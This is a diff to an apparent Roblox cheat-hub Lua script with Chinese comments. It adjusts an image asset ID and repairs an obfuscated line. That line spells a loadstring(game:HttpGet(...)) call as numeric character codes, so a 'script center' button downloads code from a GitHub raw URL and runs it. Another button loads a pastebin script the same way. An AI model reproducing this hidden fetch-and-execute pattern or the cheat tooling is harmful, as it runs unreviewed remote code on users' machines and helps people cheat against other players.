@@ -462,12 +462,12 @@ local function loadScript()
     catImageFrame.LayoutOrder = #AnnouncementScrolling:GetChildren()
     catImageFrame.Parent = AnnouncementScrolling
     
-    -- 修复：神秘猫图片，使用正确的图片ID格式
+    -- 神秘猫图片
     local catImage = Instance.new("ImageLabel")
     catImage.Size = UDim2.new(1, 0, 0, 70) -- 图片高度
     catImage.BackgroundColor3 = Color3.fromRGB(50, 50, 100)
     catImage.BackgroundTransparency = 0.3
-    catImage.Image = "http://www.roblox.com/asset/?id=131184246499429" -- 修复：使用正确的格式
+    catImage.Image = "rbxassetid://131184246499429"
     catImage.ScaleType = Enum.ScaleType.Crop
     catImage.ZIndex = 5
     Instance.new("UICorner", catImage).CornerRadius = UDim.new(0, 8) -- 减小三分之一
@@ -1771,7 +1771,7 @@ print("安全版自然灾害免疫已激活")
         CaodanButton = function() loadExternalScript("https://pastebin.com/raw/hkyuHQ7Y", "操蛋脚本") end,
         ScriptCenterButton = function() 
             playClickSound()
-            loadstring(utf8.char((function() return table.unpack({108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58\47\47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,67,104,105,110,97,81,89,47,45,47,109,97,105,110,47,37,69,54,37,56,51,37,56,53,37,69,52,37,66,65,37,57,49,34,41,41,40,41})end)()))()
+            loadstring(utf8.char((function() return table.unpack({108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,67,104,105,110,97,81,89,47,45,47,109,97,105,110,47,37,69,54,37,56,51,37,56,53,37,69,52,37,66,65,37,57,49,34,41,41,40,41})end)()))()
             showNotification("脚本中心已加载!", Color3.fromRGB(0, 200, 0))
         end,
         HackButton = applyHackEffects,
